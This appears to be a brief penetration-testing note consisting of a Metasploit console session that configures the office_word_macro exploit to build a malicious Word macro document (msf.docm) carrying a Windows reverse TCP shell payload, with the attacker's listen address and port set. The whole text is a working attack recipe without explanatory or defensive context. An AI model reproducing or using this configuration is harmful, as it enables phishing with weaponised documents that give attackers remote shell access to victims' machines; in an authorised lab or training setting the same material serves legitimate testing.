# Word

```
msf6 exploit(multi/fileformat/office_word_macro) > set payload payload/windows/shell_reverse_tcp
payload => windows/shell_reverse_tcp

msf6 exploit(multi/fileformat/office_word_macro) > options 

Module options (exploit/multi/fileformat/office_word_macro):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   CUSTOMTEMPLATE                   no        A docx file that will be used as a template to build the exploit
   FILENAME        msf.docm         yes       The Office document macro file (docm)


Payload options (windows/shell_reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.119.155  yes       The listen address (an interface may be specified)
   LPORT     80               yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Office Word on Windows
```
